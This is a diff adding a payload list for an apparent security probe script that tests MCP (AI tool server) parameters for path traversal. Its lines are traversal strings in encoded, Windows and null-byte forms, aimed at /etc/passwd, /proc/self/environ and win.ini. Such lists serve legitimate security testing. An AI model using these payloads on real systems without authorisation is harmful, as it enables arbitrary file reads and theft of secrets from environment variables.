@@ -1,0 +1,22 @@
+# MCP05 — Path traversal / arbitrary file read for tool params that take a path,
+# filename, slug, or document id. Used by artemis/scripts/mcp-probe.sh (mode: traversal).
+#
+# A file-read tool returning /etc/passwd (or a Windows equivalent) is arbitrary
+# file read (High). One payload per line.
+
+../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../etc/hostname
+../../../../proc/self/environ
+../../../../proc/self/cmdline
+..%2f..%2f..%2f..%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+....//....//....//etc/passwd
+..\..\..\..\windows\win.ini
+..%5c..%5c..%5cwindows%5cwin.ini
+/etc/passwd
+/proc/self/environ
+file:///etc/passwd
+/../../../../etc/passwd
+%00../../../etc/passwd
+../../../../etc/passwd%00.png
